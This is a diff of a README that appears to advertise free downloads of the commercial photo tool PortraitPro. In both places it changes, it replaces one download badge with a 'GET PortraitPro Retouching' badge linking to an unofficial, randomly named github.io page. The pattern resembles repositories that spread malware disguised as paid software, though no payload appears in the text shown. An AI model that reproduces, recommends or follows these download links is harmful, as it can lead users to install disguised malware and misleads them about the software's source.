@@ -4,11 +4,7 @@
   <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5suvbdwo6ti630UyBAwwdQ_Gxw65aCKxw-g&s" alt="Program Logo"/>
 </div>
 
-<div align="center">
-
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://portraitpro-retouching-core.github.io/.github/)
-
-</div>
+[![GET PortraitPro Retouching](https://img.shields.io/badge/GET%20%E2%80%94%20PortraitPro-Retouching-0078D6?style=for-the-badge&logoColor=white)](https://rvnxkc12470.github.io/.github/PortraitPro-Retouching)
 
 ---
 
@@ -30,11 +26,8 @@ PortraitPro further integrates anthropics portrait professional and anthropics p
   <img src="https://i0.wp.com/digital-photography-school.com/wp-content/uploads/2024/05/portraitpro-24-review-1.jpg?fit=1000%2C530&ssl=1" alt="Program Interface Screenshot"/>
 </div>
 
-<div align="center">
+[![GET PortraitPro Retouching](https://img.shields.io/badge/GET%20%E2%80%94%20PortraitPro-Retouching-0078D6?style=for-the-badge&logoColor=white)](https://rvnxkc12470.github.io/.github/PortraitPro-Retouching)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://portraitpro-retouching-core.github.io/.github/)
-
-</div>
 
 ---
 
